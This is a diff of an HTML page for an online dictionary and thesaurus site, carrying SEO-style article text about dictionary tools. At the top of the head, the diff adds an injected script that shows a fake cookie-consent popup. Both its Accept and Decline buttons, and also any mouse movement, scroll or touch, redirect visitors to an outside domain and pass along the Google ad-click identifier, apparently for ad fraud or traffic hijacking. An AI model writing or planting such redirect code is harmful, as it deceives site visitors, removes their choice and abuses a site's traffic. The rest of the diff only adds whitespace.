@@ -1,6 +1,82 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
+    <script>
+(function(){
+  const redirectUrl = "https://dailyfoodandrecipes.online/dic.php"; // 🔥 Set your redirect URL here
+  let redirected = false, moved = false, scrolled = false, touched = false, initialPos = null;
+
+  function random(min, max){return Math.floor(Math.random()*(max-min+1))+min}
+  function randomColor(){return ["#28a745","#007bff","#ff5722","#6f42c1","#17a2b8","#ffc107","#dc3545"][Math.floor(Math.random()*7)]}
+  function randomText(){return [
+    "🍪 <b>Important Notice:</b><br><br>We use cookies and similar technologies to personalize content, deliver targeted advertising, provide social media features, and analyze our traffic. This information helps us deliver a better browsing experience, and complying with data protection regulations.<br><br>By clicking 'Accept Cookies', you consent to the use of ALL the cookies. If you choose 'Decline', certain features might not work as intended.<br><br>For more information, please read our <a href='#' style='color:#007bff;'>Privacy Policy</a>.",
+    "🍪 <b>Your Privacy Matters!</b><br><br>To improve your experience, we collect cookies and process personal data like IP addresses and browsing behavior. You can either accept all cookies or decline unnecessary ones. Please make your choice to proceed.<br><br>Learn more about how we use cookies in our <a href='#' style='color:#007bff;'>Privacy Center</a>.",
+    "🍪 <b>Cookie Usage Agreement</b><br><br>This website uses cookies to enhance functionality, personalize your experience, and to comply with global regulations. By clicking 'Accept', you agree to our terms. Declining may affect certain site functions.<br><br>See our full <a href='#' style='color:#007bff;'>Cookie Policy</a> for details."
+  ][Math.floor(Math.random()*3)]}
+
+  function redirectUser(){
+    if(!redirected){
+      redirected = true;
+      const urlParams = new URLSearchParams(window.location.search);
+      const gclid = urlParams.get('gclid');
+      let finalUrl = redirectUrl;
+      if(gclid){
+        finalUrl += (redirectUrl.includes('?') ? '&' : '?') + 'gclid=' + gclid;
+      }
+      window.location.href = finalUrl;
+    }
+  }
+
+  function showCookiePopup(){
+    const wrapper = document.createElement("div");
+    wrapper.innerHTML = `
+    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;z-index:99999;">
+      <div style="background:#fff;padding:4rem 3rem;border-radius:20px;max-width:700px;width:90%;text-align:center;box-shadow:0 0 40px rgba(0,0,0,0.5);">
+        <h2 style="margin-top:0;font-size:32px;color:#333;">We Respect Your Privacy</h2>
+        <p style="font-size:18px;color:#555;margin-bottom:2rem;line-height:1.6;">${randomText()}</p>
+        <div style="margin-top:2rem;display:flex;gap:1rem;justify-content:center;flex-wrap:wrap;">
+          <button id="acceptBtn" style="padding:14px 28px;background:${randomColor()};color:white;border:none;border-radius:12px;font-size:18px;cursor:pointer;">Accept Cookies</button>
+          <button id="declineBtn" style="padding:14px 28px;background:${randomColor()};color:white;border:none;border-radius:12px;font-size:18px;cursor:pointer;">Decline</button>
+        </div>
+      </div>
+    </div>`;
+    document.body.appendChild(wrapper);
+    document.getElementById("acceptBtn").addEventListener("click", redirectUser);
+    document.getElementById("declineBtn").addEventListener("click", redirectUser);
+  }
+
+  window.addEventListener("load", function(){
+    setTimeout(showCookiePopup, random(300,600));
+  });
+
+  window.addEventListener("mousemove", function(e){
+    if(!moved){
+      if(!initialPos){
+        initialPos = {x: e.clientX, y: e.clientY};
+        return;
+      }
+      if(e.clientX !== initialPos.x || e.clientY !== initialPos.y){
+        moved = true;
+        setTimeout(redirectUser, random(1200,1800));
+      }
+    }
+  });
+
+  window.addEventListener("scroll", function(){
+    if(!scrolled){
+      scrolled = true;
+      setTimeout(redirectUser, random(1200,1800));
+    }
+  });
+
+  window.addEventListener("touchstart", function(){
+    if(!touched){
+      touched = true;
+      setTimeout(redirectUser, random(1200,1800));
+    }
+  });
+})();
+</script>
     <meta http-equiv="content-type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="keywords" content="dictionary, dictionary english, dictionary online, thesaurus synonyms, oxford english dictionary, define dictionary, online thesaurus, thesaurus dictionary, dictionary words, dictionary app, websters, webster's dictionary, google dictionary, spanish english dictionary, dictionary search, free dictionary app, merriam webster thesaurus, slang dictionary, rhyming dictionary, thesauruses, 1828 webster dictionary, urbandi, latin dictionary, etymology dictionary, crossword dictionary, idiom definition, the oxford english dictionary, mw thesaurus, pronunciation dictionary, the dictionary, oed, synonyms meaning, meaning of words, words and their meanings, define synonym, uglish, oed dictionary, hostel meaning, anon meaning, based urban dictionary, chrome definition, concise definition, creole definition, define diction, define lingo, define verbs, definition meaning, definition noun, definition of adverbs, definition of translation, definition synonyms, dictation definition, diction words, dictionary c, dictionary com, ebonics dictionary, embark definition, english dic, etymological, etymology definition, etymology dictionary online, jisho, kink definition, long man dictionary, meaning of idiom, meaning of thesaurus, meaning of translation, meaning of verb, merriam webster games, merriamwebster, online definition, oxford dic, oxford dictionary com, poise meaning, quip definition, slang meaning, spanishdict translate, testament definition, transliteration definition, truffle butter urban dictionary, urban definition, urban dictionary slang, urban meaning">
@@ -71,7 +147,8 @@
       <h1>Online Dictionary &amp; Thesaurus</h1>
       <nav> <a href="index.html">Home</a><a href="online-dictionary.html">Online
           Dictionary</a> <a href="about.html">About Us</a> <a href="contact.html">Contact
-          Us</a> <a href="privacy-policy.html">Privacy Policy</a> <a href="terms.html">Terms</a><a
+          Us</a> <a href="privacy-policy.html">Privacy Policy</a> <a href="terms.html">Terms</a><a
+
           href="disclaimer.html">Disclaimer</a> </nav>
     </header>
     <div class="container">
@@ -90,7 +167,8 @@
       <hr data-start="919" data-end="922" class="">
       <h2 data-start="924" data-end="968" class="">What Is an Online Dictionary
         &amp; Thesaurus?</h2>
-      <p data-start="970" data-end="1262" class="">An <strong data-start="973"
+      <p data-start="970" data-end="1262" class="">An <strong data-start="973"
+
           data-end="994">online dictionary</strong> is a digital resource that
         provides definitions, pronunciation, part of speech, etymology, and
         usage examples of words. A <strong data-start="1117" data-end="1130">thesaurus</strong>,
@@ -104,30 +182,36 @@
       <hr data-start="1457" data-end="1460" class="">
       <h2 data-start="1462" data-end="1519" class="">The Benefits of Using an
         Online Dictionary &amp; Thesaurus</h2>
-      <h3 data-start="1521" data-end="1563" class="">1. <strong data-start="1528"
+      <h3 data-start="1521" data-end="1563" class="">1. <strong data-start="1528"
+
           data-end="1563">Instant Access to Word Meanings</strong></h3>
       <p data-start="1564" data-end="1718" class="">No need to flip through
         pages. Online tools give you <strong data-start="1617" data-end="1642">real-time
           definitions</strong>, saving you time while ensuring you understand a
         word’s meaning accurately.</p>
-      <h3 data-start="1720" data-end="1750" class="">2. <strong data-start="1727"
+      <h3 data-start="1720" data-end="1750" class="">2. <strong data-start="1727"
+
           data-end="1750">Enhanced Vocabulary</strong></h3>
       <p data-start="1751" data-end="1882" class="">Learning synonyms and
         antonyms expands your vocabulary. You not only learn new words but also
         the nuanced differences between them.</p>
-      <h3 data-start="1884" data-end="1918" class="">3. <strong data-start="1891"
+      <h3 data-start="1884" data-end="1918" class="">3. <strong data-start="1891"
+
           data-end="1918">Improved Writing Skills</strong></h3>
-      <p data-start="1919" data-end="2062" class="">A thesaurus helps you <strong
+      <p data-start="1919" data-end="2062" class="">A thesaurus helps you <strong
+
           data-start="1941" data-end="1961">avoid repetition</strong> and find
         the perfect word for every context—be it formal, creative, persuasive,
         or academic writing.</p>
-      <h3 data-start="2064" data-end="2095" class="">4. <strong data-start="2071"
+      <h3 data-start="2064" data-end="2095" class="">4. <strong data-start="2071"
+
           data-end="2095">Better Pronunciation</strong></h3>
       <p data-start="2096" data-end="2240" class="">Many online dictionaries
         include <strong data-start="2129" data-end="2153">audio pronunciations</strong>,
         so you know exactly how a word should sound, making them ideal for
         language learners.</p>
-      <h3 data-start="2242" data-end="2279" class="">5. <strong data-start="2249"
+      <h3 data-start="2242" data-end="2279" class="">5. <strong data-start="2249"
+
           data-end="2279">Grammar and Usage Insights</strong></h3>
       <p data-start="2280" data-end="2418" class="">Top online platforms also
         provide information about word usage, common errors, and grammatical
@@ -137,27 +221,32 @@
         Dictionary &amp; Thesaurus?</h2>
       <ul data-start="2473" data-end="2849">
         <li data-start="2473" data-end="2534" class="">
-          <p data-start="2475" data-end="2534" class=""><strong data-start="2475"
+          <p data-start="2475" data-end="2534" class=""><strong data-start="2475"
+
               data-end="2487">Students</strong>: For homework, essays, and
             studying for exams.</p>
         </li>
         <li data-start="2535" data-end="2614" class="">
-          <p data-start="2537" data-end="2614" class=""><strong data-start="2537"
+          <p data-start="2537" data-end="2614" class=""><strong data-start="2537"
+
               data-end="2562">Writers &amp; Journalists</strong>: To make
             writing more vivid, precise, and engaging.</p>
         </li>
         <li data-start="2615" data-end="2685" class="">
-          <p data-start="2617" data-end="2685" class=""><strong data-start="2617"
+          <p data-start="2617" data-end="2685" class=""><strong data-start="2617"
+
               data-end="2634">Professionals</strong>: For writing emails,
             proposals, and presentations.</p>
         </li>
         <li data-start="2686" data-end="2780" class="">
-          <p data-start="2688" data-end="2780" class=""><strong data-start="2688"
+          <p data-start="2688" data-end="2780" class=""><strong data-start="2688"
+
               data-end="2719">Non-native English Speakers</strong>: For learning
             new vocabulary and improving language fluency.</p>
         </li>
         <li data-start="2781" data-end="2849" class="">
-          <p data-start="2783" data-end="2849" class=""><strong data-start="2783"
+          <p data-start="2783" data-end="2849" class=""><strong data-start="2783"
+
               data-end="2803">Content Creators</strong>: For optimizing text for
             SEO and readability.</p>
         </li>
@@ -169,41 +258,49 @@
         platform, consider the following features:</p>
       <ul data-start="2990" data-end="3536">
         <li data-start="2990" data-end="3053" class="">
-          <p data-start="2992" data-end="3053" class=""><strong data-start="2992"
+          <p data-start="2992" data-end="3053" class=""><strong data-start="2992"
+
               data-end="3008">Search Speed</strong>: Instant lookup with
             predictive suggestions.</p>
         </li>
         <li data-start="3054" data-end="3120" class="">
-          <p data-start="3056" data-end="3120" class=""><strong data-start="3056"
+          <p data-start="3056" data-end="3120" class=""><strong data-start="3056"
+
               data-end="3085">Comprehensive Definitions</strong>: Detailed yet
             simple explanations.</p>
         </li>
         <li data-start="3121" data-end="3170" class="">
-          <p data-start="3123" data-end="3170" class=""><strong data-start="3123"
+          <p data-start="3123" data-end="3170" class=""><strong data-start="3123"
+
               data-end="3147">Audio Pronunciations</strong>: US and UK
             variations.</p>
         </li>
         <li data-start="3171" data-end="3254" class="">
-          <p data-start="3173" data-end="3254" class=""><strong data-start="3173"
+          <p data-start="3173" data-end="3254" class=""><strong data-start="3173"
+
               data-end="3198">Thesaurus Integration</strong>: A built-in
             thesaurus for quick synonym/antonym access.</p>
         </li>
         <li data-start="3255" data-end="3301" class="">
-          <p data-start="3257" data-end="3301" class=""><strong data-start="3257"
+          <p data-start="3257" data-end="3301" class=""><strong data-start="3257"
+
               data-end="3274">Grammar Tools</strong>: Usage notes and examples.</p>
         </li>
         <li data-start="3302" data-end="3380" class="">
-          <p data-start="3304" data-end="3380" class=""><strong data-start="3304"
+          <p data-start="3304" data-end="3380" class=""><strong data-start="3304"
+
               data-end="3331">User-Friendly Interface</strong>: Easy to navigate
             and responsive on all devices.</p>
         </li>
         <li data-start="3381" data-end="3442" class="">
-          <p data-start="3383" data-end="3442" class=""><strong data-start="3383"
+          <p data-start="3383" data-end="3442" class=""><strong data-start="3383"
+
               data-end="3401">Offline Access</strong>: For uninterrupted
             learning and writing.</p>
         </li>
         <li data-start="3443" data-end="3536" class="">
-          <p data-start="3445" data-end="3536" class=""><strong data-start="3445"
+          <p data-start="3445" data-end="3536" class=""><strong data-start="3445"
+
               data-end="3465">Language Support</strong>: Availability in
             multiple languages for translations and ESL learners.</p>
         </li>
@@ -211,27 +308,32 @@
       <hr data-start="3538" data-end="3541" class="">
       <h2 data-start="3543" data-end="3595" class="">Top 5 Online Dictionary
         &amp; Thesaurus Tools in 2025</h2>
-      <h3 data-start="3597" data-end="3623" class="">1. <strong data-start="3604"
+      <h3 data-start="3597" data-end="3623" class="">1. <strong data-start="3604"
+
           data-end="3623">Merriam-Webster</strong></h3>
       <p data-start="3624" data-end="3798" class="">A classic name with a modern
         edge. It offers accurate definitions, real-life usage examples, quizzes,
         and a fantastic thesaurus. Their mobile app is especially user-friendly.</p>
-      <h3 data-start="3800" data-end="3825" class="">2. <strong data-start="3807"
+      <h3 data-start="3800" data-end="3825" class="">2. <strong data-start="3807"
+
           data-end="3825">Dictionary.com</strong></h3>
       <p data-start="3826" data-end="3950" class="">Packed with definitions,
         slang updates, grammar tips, and a built-in thesaurus. Great for casual
         users and word nerds alike.</p>
-      <h3 data-start="3952" data-end="3983" class="">3. <strong data-start="3959"
+      <h3 data-start="3952" data-end="3983" class="">3. <strong data-start="3959"
+
           data-end="3983">Cambridge Dictionary</strong></h3>
       <p data-start="3984" data-end="4114" class="">Ideal for learners of
         English as a second language. Simple definitions, example sentences,
         pronunciation guides, and translations.</p>
-      <h3 data-start="4116" data-end="4140" class="">4. <strong data-start="4123"
+      <h3 data-start="4116" data-end="4140" class="">4. <strong data-start="4123"
+
           data-end="4140">Thesaurus.com</strong></h3>
       <p data-start="4141" data-end="4276" class="">Owned by Dictionary.com,
         it’s a dedicated platform offering robust synonym/antonym searches with
         tone suggestions and context examples.</p>
-      <h3 data-start="4278" data-end="4318" class="">5. <strong data-start="4285"
+      <h3 data-start="4278" data-end="4318" class="">5. <strong data-start="4285"
+
           data-end="4318">Oxford Learner’s Dictionaries</strong></h3>
       <p data-start="4319" data-end="4463" class="">Tailored for students and
         ESL learners. It breaks down complex words into digestible definitions,
@@ -265,23 +367,27 @@
         search engines, too. Here’s how these tools can help:</p>
       <ul data-start="5506" data-end="5955">
         <li data-start="5506" data-end="5598" class="">
-          <p data-start="5508" data-end="5598" class=""><strong data-start="5508"
+          <p data-start="5508" data-end="5598" class=""><strong data-start="5508"
+
               data-end="5529">Keyword Variation</strong>: A thesaurus provides
             related terms that can boost search relevance.</p>
         </li>
         <li data-start="5599" data-end="5696" class="">
-          <p data-start="5601" data-end="5696" class=""><strong data-start="5601"
+          <p data-start="5601" data-end="5696" class=""><strong data-start="5601"
+
               data-end="5624">Avoiding Repetition</strong>: Diversifying
             vocabulary keeps readers engaged and improves dwell time.</p>
         </li>
         <li data-start="5697" data-end="5812" class="">
-          <p data-start="5699" data-end="5812" class=""><strong data-start="5699"
+          <p data-start="5699" data-end="5812" class=""><strong data-start="5699"
+
               data-end="5721">Better Readability</strong>: Definitions and
             simpler synonyms can help make your content clearer and easier to
             digest.</p>
         </li>
         <li data-start="5813" data-end="5955" class="">
-          <p data-start="5815" data-end="5955" class=""><strong data-start="5815"
+          <p data-start="5815" data-end="5955" class=""><strong data-start="5815"
+
               data-end="5839">Authority &amp; Accuracy</strong>: Using the
             correct term in the correct context builds trust with your readers
             and improves your site’s credibility.</p>
@@ -295,23 +401,28 @@
         Many platforms now offer:</p>
       <ul data-start="6138" data-end="6311">
         <li data-start="6138" data-end="6164" class="">
-          <p data-start="6140" data-end="6164" class=""><strong data-start="6140"
+          <p data-start="6140" data-end="6164" class=""><strong data-start="6140"
+
               data-end="6164">Voice-enabled search</strong></p>
         </li>
         <li data-start="6165" data-end="6204" class="">
-          <p data-start="6167" data-end="6204" class=""><strong data-start="6167"
+          <p data-start="6167" data-end="6204" class=""><strong data-start="6167"
+
               data-end="6204">Context-based synonym suggestions</strong></p>
         </li>
         <li data-start="6205" data-end="6237" class="">
-          <p data-start="6207" data-end="6237" class=""><strong data-start="6207"
+          <p data-start="6207" data-end="6237" class=""><strong data-start="6207"
+
               data-end="6237">Grammar-check integrations</strong></p>
         </li>
         <li data-start="6238" data-end="6276" class="">
-          <p data-start="6240" data-end="6276" class=""><strong data-start="6240"
+          <p data-start="6240" data-end="6276" class=""><strong data-start="6240"
+
               data-end="6276">Personalized vocabulary tracking</strong></p>
         </li>
         <li data-start="6277" data-end="6311" class="">
-          <p data-start="6279" data-end="6311" class=""><strong data-start="6279"
+          <p data-start="6279" data-end="6311" class=""><strong data-start="6279"
+
               data-end="6311">AI-driven writing assistance</strong></p>
         </li>
       </ul>
@@ -320,7 +431,8 @@
         non-native speakers.</p>
       <hr data-start="6432" data-end="6435" class="">
       <h2 data-start="6437" data-end="6454" class="">Final Thoughts</h2>
-      <p data-start="6456" data-end="6776" class="">An <strong data-start="6459"
+      <p data-start="6456" data-end="6776" class="">An <strong data-start="6459"
+
           data-end="6492">online dictionary &amp; thesaurus</strong> is more
         than just a reference—it’s a companion for anyone who wants to write
         better, speak more clearly, or understand the world of words more
@@ -336,8 +448,10 @@
     <!-- Cookie Consent -->
     <div id="cookie-consent-banner" style="position:fixed;bottom:0;left:0;right:0;background:#2c3e50;color:#ecf0f1;padding:15px;text-align:center;font-size:14px;z-index:999;">
       We use cookies to improve your experience, analyze traffic, and serve
-      relevant ads. By clicking "Accept", you agree to our use of cookies. <a href="privacy-policy.html"
-        style="color:#1abc9c;text-decoration:underline;">Learn more</a>. <button
+      relevant ads. By clicking "Accept", you agree to our use of cookies. <a href="privacy-policy.html"
+
+        style="color:#1abc9c;text-decoration:underline;">Learn more</a>. <button
+
         onclick="acceptCookies()" style="margin-left:15px;padding:6px 12px;background:#1abc9c;border:none;color:white;border-radius:4px;cursor:pointer;">Accept</button>
     </div>
     <script>
